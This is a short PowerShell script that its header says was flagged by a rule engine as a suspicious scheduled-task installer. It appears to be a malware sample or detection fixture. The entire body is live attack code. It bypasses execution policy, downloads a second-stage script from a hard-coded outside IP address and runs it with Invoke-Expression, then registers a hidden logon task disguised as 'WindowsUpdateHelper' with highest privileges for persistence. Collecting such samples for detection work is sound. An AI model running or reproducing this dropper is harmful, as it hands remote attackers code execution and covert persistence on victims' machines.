# PowerShell execution script - suspicious scheduled task installer
# Detected by FORENSEQUENCE rule engine as suspicious_process_execution

param (
    [string]$TargetHost = "192.168.1.1",
    [int]$Port = 4444
)

# Bypass execution policy
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# Download and execute remote payload
$WebClient = New-Object System.Net.WebClient
$Payload = $WebClient.DownloadString("http://185.220.101.47/stage2.ps1")
Invoke-Expression $Payload

# Install persistence via scheduled task
$Action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File $PSCommandPath"
$Trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "WindowsUpdateHelper" -Action $Action -Trigger $Trigger -RunLevel Highest -Force

Write-Host "Persistence installed successfully."
